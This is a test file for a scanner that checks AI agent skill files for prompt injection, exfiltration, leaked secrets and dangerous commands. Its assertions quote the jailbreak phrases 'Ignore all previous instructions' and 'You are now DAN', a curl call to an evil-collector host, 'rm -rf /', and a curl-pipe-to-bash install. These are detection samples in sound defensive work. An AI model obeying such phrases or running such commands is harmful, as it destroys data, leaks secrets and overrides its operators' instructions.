import { readFile } from 'node:fs/promises';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import {
  checkDangerousCommands,
  checkDataExfiltration,
  checkExternalFetches,
  checkObfuscation,
  checkPrivilegeEscalation,
  checkPromptInjection,
  checkSchemaValidation,
  checkSecretDetection,
  scanPath,
  scanSkill,
} from '../index.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const fixtures = join(__dirname, 'fixtures');

async function loadFixture(name: string): Promise<string> {
  return readFile(join(fixtures, name), 'utf8');
}

describe('scanSkill', () => {
  it('returns a clean report for safe content', async () => {
    const report = scanSkill(await loadFixture('clean.md'));
    expect(report.score).toBeGreaterThanOrEqual(90);
    expect(report.blocked).toBe(false);
    expect(report.issues).toHaveLength(0);
  });

  it('blocks prompt injection and detects explicit phrases', async () => {
    const report = scanSkill(await loadFixture('injection.md'));
    expect(report.blocked).toBe(true);
    expect(report.issues.some((issue) => issue.code === 'PROMPT_INJECTION')).toBe(true);
    expect(report.issues.some((issue) => issue.evidence?.includes('Ignore all previous instructions'))).toBe(
      true,
    );
    expect(report.issues.some((issue) => issue.evidence?.includes('You are now DAN'))).toBe(true);
  });

  it('detects data exfiltration through curl and fetch', async () => {
    const report = scanSkill(await loadFixture('exfil.md'));
    expect(report.issues.some((issue) => issue.code === 'DATA_EXFILTRATION')).toBe(true);
    expect(report.issues.some((issue) => issue.evidence?.includes('curl https://evil-collector.com'))).toBe(
      true,
    );
    expect(report.issues.some((issue) => issue.evidence?.includes('fetch('))).toBe(true);
  });

  it('detects OpenAI, AWS, and GitHub secret patterns', async () => {
    const report = scanSkill(await loadFixture('secrets.md'));
    expect(report.issues.some((issue) => issue.code === 'SECRET_DETECTED')).toBe(true);
    expect(report.issues.filter((issue) => issue.code === 'SECRET_DETECTED')).toHaveLength(3);
  });

  it('detects dangerous command patterns', async () => {
    const report = scanSkill(await loadFixture('dangerous.md'));
    expect(report.issues.some((issue) => issue.code === 'DANGEROUS_COMMAND')).toBe(true);
    expect(report.issues.some((issue) => issue.evidence?.includes('rm -rf /'))).toBe(true);
    expect(report.issues.some((issue) => issue.evidence?.includes('curl https://install.sh | bash'))).toBe(
      true,
    );
  });

  it('returns the required SecurityReport shape', async () => {
    const report = scanSkill(await loadFixture('clean.md'));
    expect(report).toEqual(
      expect.objectContaining({
        skill_name: 'clean-skill',
        score: expect.any(Number),
        passed: expect.any(Boolean),
        blocked: expect.any(Boolean),
        issues: expect.any(Array),
        scanned_at: expect.any(String),
      }),
    );
  });
});

describe('scanPath', () => {
  it('scans a SKILL.md directory', async () => {
    const report = await scanPath(join(fixtures, 'bad-clean'));
    expect(report.skill_name).toBe('clean-skill');
  });

  it('scans a direct markdown file path', async () => {
    const report = await scanPath(join(fixtures, 'clean.md'));
    expect(report.skill_name).toBe('clean-skill');
  });
});

describe('score and exports', () => {
  it('critical issue keeps score at or below 75', async () => {
    const report = scanSkill(await loadFixture('injection.md'));
    expect(report.score).toBeLessThanOrEqual(75);
  });

  it('multiple criticals are blocked', async () => {
    const report = scanSkill(`${await loadFixture('injection.md')}\n${await loadFixture('secrets.md')}`);
    expect(report.blocked).toBe(true);
  });

  it('exports all 8 check functions', () => {
    expect([
      checkSchemaValidation,
      checkPromptInjection,
      checkDataExfiltration,
      checkSecretDetection,
      checkDangerousCommands,
      checkObfuscation,
      checkPrivilegeEscalation,
      checkExternalFetches,
    ].every((check) => typeof check === 'function')).toBe(true);
  });
});
